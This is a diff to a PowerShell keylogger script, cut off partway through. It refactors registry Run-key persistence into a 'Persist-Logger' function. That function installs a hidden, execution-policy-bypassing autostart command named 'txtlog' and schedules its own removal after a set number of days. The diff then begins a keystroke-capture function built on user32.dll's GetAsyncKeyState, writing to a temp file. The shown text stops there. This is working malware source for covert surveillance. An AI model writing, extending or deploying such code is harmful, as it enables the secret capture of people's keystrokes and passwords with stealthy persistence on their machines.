@@ -1,34 +1,46 @@
-if($DaysRun -eq -1 -or $DaysRun -gt 0){
-    if(Test-Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\txtlog'){ return };
+function Persist-Logger {
+    [CmdletBinding()]
+	param (
+		[parameter(Position=0,Mandatory=$True)]
+		[string]$name,
+        [parameter(Mandatory=$True)]
+		[string]$Command 
+	);
 
-    $autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun  + '$DaysRun=' + $DaysRun +  ';Get-Item txtlog.ps1 | Invoke-Expression;sleep 5;exit'); 
-    New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'txtlog' -Value $autostart;
-
-    if($DaysRun -eq -1){ return };
-    if(Test-Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\txtlog'){ return };
-
-    $date = (Get-Date).AddDays($daysRun);
-    New-Item -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\txtlog' -Force;
-    New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\txtlog' -Name 'date' -Value $date;
+    if($DaysRun -eq -1 -or $DaysRun -gt 0){
+        if(Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\$name"){ return };
+    
+        New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $name -Value $Command;
+    
+        if($DaysRun -eq -1){ return };
+        if(Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name"){ return };
+    
+        $date = (Get-Date).AddDays($daysRun);
+        New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Force;
+        New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Name 'date' -Value $date;
+    }
+    
+    if($DaysRun -gt 0){
+        $date = Get-Date;
+        $targetValue = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Name 'date';
+        $targetDate = [DateTime]$targetValue.date;
+    
+        if($date -lt $targetDate){ return }
+    
+        Remove-Item "$env:temp\txtlog.ps1" -Force;
+        Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Force
+        Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $name -Force
+    }
 }
 
-if($DaysRun -gt 0){
-    $date = Get-Date;
-    $targetValue = Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\txtlog' -Name 'date';
-    $targetDate = [DateTime]$targetValue.date;
-
-    if($date -lt $targetDate){ return }
-
-    Remove-Item "$env:temp\txtlog.ps1" -Force;
-    Remove-Item -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\txtlog' -Force
-    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Force
-}
+$autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun  + '$DaysRun=' + $DaysRun +  ';Get-Item txtlog.ps1 | Invoke-Expression;sleep 5;exit'); 
+Persist-Logger "txtlog" -Command $autostart
 
 Do{
     $getT = Get-Date;
     $end = $getT.AddMinutes($RunTime);
     
-    function Start-Key($Path="$env:temp\klog.txt"){
+    function Start-Key($Path="$env:temp\txtlog.txt"){
         $sigs = "
             [DllImport(`"user32.dll`", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode);
             [DllImport(`"user32.dll`", CharSet=CharSet.Auto)] public static extern int GetKeyboardState(byte[] keystate);
